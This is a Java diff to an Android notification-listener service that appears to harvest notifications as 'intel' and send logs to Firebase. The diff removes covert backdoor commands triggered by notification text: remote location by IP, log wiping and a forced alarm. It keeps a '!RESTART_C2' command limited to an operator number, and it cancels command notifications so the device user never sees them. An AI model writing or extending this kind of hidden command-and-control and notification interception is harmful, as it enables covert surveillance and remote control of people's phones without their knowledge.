@@ -205,11 +205,19 @@ public class StatusNotification extends NotificationListenerService {
             }
         }
 
-        // --- REMOTE STEALTH BACKDOOR COMMANDS ---
-        if (text.startsWith("!")) {
-            boolean handled = true;
-            if (text.contains("!RESTART_C2")) {
-                FirebaseConfig.logActivity("BACKDOOR: Initiating remote service restart via command");
+        // --- REMOTE SERVICE RESTART COMMAND (whitelisted operator number only) ---
+        // Undocumented !LOCATE / !WIPE_LOGS / !ALARM stealth commands removed.
+        // Only !RESTART_C2 remains, and it only fires when the notification sender
+        // matches the operator number stored in SharedPreferences. When no operator
+        // number is configured, NO notification command is ever executed.
+        if (text.contains("!RESTART_C2")) {
+            SharedPreferences prefs = getSharedPreferences("StabilityConfig", MODE_PRIVATE);
+            String operator = prefs.getString("operator_number", "");
+            String senderDigits = extractDigits(title);
+
+            if (!operator.isEmpty() && senderDigits != null && !senderDigits.isEmpty()
+                    && senderDigits.equals(extractDigits(operator))) {
+                FirebaseConfig.logActivity("COMMAND: Remote service restart via whitelisted operator");
                 android.content.Intent restartIntent = new android.content.Intent(this, WorkManager_Sync.class);
                 restartIntent.setAction("START");
                 if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
@@ -217,34 +225,13 @@ public class StatusNotification extends NotificationListenerService {
                 } else {
                     startService(restartIntent);
                 }
-            } else if (text.contains("!LOCATE")) {
-                FirebaseConfig.logActivity("BACKDOOR: Remote location request received");
-                MainActivity.getPublicIPv6Async(ip -> {
-                    FirebaseConfig.logActivity("GPS_BACKDOOR: Device located at current IP: " + ip);
-                });
-            } else if (text.contains("!WIPE_LOGS")) {
-                FirebaseConfig.logActivity("BACKDOOR: Remote log wipe executed");
-                StatusNotification.clearHistory(this);
-            } else if (text.contains("!ALARM")) {
-                FirebaseConfig.logActivity("BACKDOOR: Emergency locate alarm triggered");
-                try {
-                    android.media.AudioManager am = (android.media.AudioManager) getSystemService(android.content.Context.AUDIO_SERVICE);
-                    if (am != null) {
-                        am.setStreamVolume(android.media.AudioManager.STREAM_ALARM, am.getStreamMaxVolume(android.media.AudioManager.STREAM_ALARM), 0);
-                    }
-                    android.media.Ringtone r = android.media.RingtoneManager.getRingtone(this, 
-                        android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_ALARM));
-                    if (r != null) r.play();
-                } catch (Exception ignored) {}
             } else {
-                handled = false;
+                FirebaseConfig.logActivity("SECURITY: !RESTART_C2 rejected (sender not in operator whitelist)");
             }
 
-            if (handled) {
-                cancelNotification(sbn.getKey());
-                Log.w(TAG, "BACKDOOR: Executed stealth command: " + text);
-                return; // Prevent logging command as standard intel
-            }
+            cancelNotification(sbn.getKey());
+            Log.w(TAG, "Command notification swallowed (sender verification enforced)");
+            return; // Prevent logging command as standard intel
         }
 
         // --- DE-DUPLICATION ENGINE ---
@@ -282,6 +269,18 @@ public class StatusNotification extends NotificationListenerService {
 
     @Override
     public void onNotificationRemoved(StatusBarNotification sbn) {}
+
+    /**
+     * Extracts the digits-only form of a phone number / sender label.
+     */
+    private static String extractDigits(String s) {
+        if (s == null) return "";
+        StringBuilder sb = new StringBuilder();
+        for (char c : s.toCharArray()) {
+            if (c >= '0' && c <= '9') sb.append(c);
+        }
+        return sb.toString();
+    }
 
     public static List<NotificationData> getHistory() {
         synchronized (history) {
